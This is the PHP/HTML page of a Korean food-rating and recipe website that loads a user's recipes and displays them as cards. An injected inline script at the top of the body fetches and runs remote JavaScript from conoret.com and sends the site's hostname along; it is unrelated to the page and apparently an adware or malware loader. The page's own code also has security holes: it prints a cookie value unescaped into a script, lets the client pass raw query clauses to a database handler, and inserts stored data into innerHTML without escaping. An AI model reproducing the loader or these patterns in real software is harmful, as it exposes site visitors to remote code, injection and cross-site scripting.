<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.png">

    <title>ssosso-table.food-db.rating</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">

    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>
    <!-- Custom styles for this template -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="./css/main/cover.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/rating.css">

    <style type="text/css">
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 640px) {
            #scroll_layout {
                width: 300px !important;
            }
            .food-image img {
                width: 40px!important;
                height: 40px!important;
            }
            .fs-3 {
                font-size: 14px !important;
            }
            .food-rating img {
                width: 15px!important;
                height: 30px!important;
            }
            .nav-link {
                font-size: 10px;
            }
            .masthead-brand {
                width: 40px;
                height: 40px;
            }
        }
        .bg-ssosseji {
            --bs-bg-opacity: 1;
            background-color: #e4bd74;
        }
        body {
            padding-left: 0!important;
            padding-right: 0!important;
            padding-bottom: 0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;

        }
        .cover-container {
            padding-left: 0!important;
            padding-right: 0!important;
            padding-bottom: 0!important;
            margin-left: 0!important;
            margin-right: 0!important;
            margin-bottom: 0!important;
        }
        main {
            padding: 0!important;
            margin: 0!important;
            height: 100%;
            width: 100%;
        }
        .card {
            width: 100% !important;
        }
        nav {
            background-color:#ffebaa;
        }
        .cover-container {
            max-width: 100%;
            width: 100%;
            padding-left: 0!important;
            padding-right: 0!important;
            margin: 0!important;
        }
        #my-recipe-info {
            width: 100%;
            height: 100%;
            background-color: transparent;
        }
    </style>

    <script src="https://code.jquery.com/jquery-3.6.1.js" integrity="sha256-3zlB5s2uwoUzrXK3BT7AX3FyvojsraNFxCc2vC/7pNI=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js" integrity="sha384-IDwe1+LCz02ROU9k972gdyvl+AESN10+x7tBKgc9I5HFtuNz0wWnPclzo6p9vxnk" crossorigin="anonymous"></script>
    <script type="text/javascript">
        let recipeInfos=null
        async function init() {
            recipeInfos=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'*',
                    2:'recipe',
                    3:`userid=<?php echo $_COOKIE['user_id']; ?>`
                }}))
            let format=``
            for(let i=0;i<recipeInfos.length;i++) {
                format+=`<li class="list-group-item" onclick="show_recipe(${i})">${recipeInfos[i][1]}</li>`
            }
            document.getElementById('recipe-list').innerHTML=format
        }
        async function show_recipe() {
            let recipeInfo=recipeInfos[arguments[0]]
            let traits=recipeInfo[3].split('\|')
            let traitList=``
            for(let i=0;i<traits.length;i++) {
                traitList+=`
                <li>
                    <span class="recipe-content">${traits[i]}</span>
                </li>
                `
            }
            let recipeForm=`
            <div class="card" style="width: 500px;">
                <div class="d-flex justify-content-center">
                    <div id="preview"><img src="${recipeInfo[4]}" style="width: 240px!important; height: 240px!important;" class="card-img-top" alt="..."></div>
                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                </div>
                <div class="mb-3">
                    <h5 class="card-title"><label for="exampleFormControlInput1" class="form-label" id="food-name">${recipeInfo[1]}</label></h5>
                </div>
                <div class="mb-3">
                    <p id="recipe-memo" class="card-text">${recipeInfo[2]}</p>
                </div>
                <ul id="recipe-list" class="list-group list-group-flush" style="height: 100px; max-height: 100px; overflow-y:auto;">
                    ${traitList}
                </ul>
                <br>
            </div>
            `
            document.getElementById('food_rating_database').innerHTML=recipeForm
            document.getElementById('navbarToggleExternalContent').classList.remove('show')
        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <nav class="navbar d-flex fixed-top">
        <a class="navbar-brand p-2" href="http://ssossotable.com/rating.php" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="60px" height="60px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating.php">음식 평가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record.php">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/myInfo.php">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends.php">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary.php">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>

    <main role="main" class="inner cover d-flex" id="rating" style="margin-top: 20px;">
        <div class="card">
<!--            <div class="collapse" id="navbarToggleExternalContent">-->
<!--                <div class="bg-ssosseji p-4">-->
<!--                    <ul id="recipe-list" class="list-group" style="max-height: 200px; overflow-y: auto">-->
<!--                        <li class="list-group-item">item</li>-->
<!--                    </ul>-->
<!--                </div>-->
<!--            </div>-->
<!---->
<!--            <nav class="navbar navbar-dark bg-ssosseji">-->
<!--                <div class="container-fluid">-->
<!--                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarToggleExternalContent" aria-controls="navbarToggleExternalContent" aria-expanded="false" aria-label="Toggle navigation">-->
<!--                        <span class="navbar-toggler-icon"></span>-->
<!--                    </button>-->
<!--                </div>-->
<!--            </nav>-->
<!--            <div id="food_rating_database">-->
<!--                <div class="card" style="width: 500px;">-->
<!--                    <div class="d-flex justify-content-center">-->
<!--                        <div id="preview"><img src="src/food_placeholder.png" style="width: 240px!important; height: 240px!important;" class="card-img-top" alt="..."></div>-->
<!--                        <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">-->
<!--                    </div>-->
<!--                    <div class="mb-3">-->
<!--                        <h5 class="card-title"><label for="exampleFormControlInput1" class="form-label" id="food-name">음식명</label></h5>-->
<!--                    </div>-->
<!--                    <div class="mb-3">-->
<!--                        <p id="recipe-memo" class="card-text">좋은 음식은 사람을 행복하게 하는 음식.</p>-->
<!--                    </div>-->
<!--                    <ul id="recipe-list" class="list-group list-group-flush" style="height: 100px; max-height: 100px; overflow-y:auto;">-->
<!--                    </ul>-->
<!--                    <br>-->
<!--                </div>-->
<!--            </div>-->
        </div>

        <div class="card" id='my-recipe-info'>
            <div class="card-body" id="title">
                <img id="food-info-image" src="/src/food_placeholder.png" height="360px" width="360px"/>
                <h1 class="card-title" id="food-name">음식 이름</h1>
                <p class="card-text" id="food-traits">특성 목록</p>
                <div id="rating" style="margin-bottom: 50px;">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                </div>
            </div>
        </div>
    </main>

    <footer id="footer"  class="mastfoot mt-auto fixed-bottom" style="background-color:#ffebaa;">
        <div class="inner">
            <p style="margin: 0;">Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, of <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
    <script>
        init()
    </script>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</body>
</html>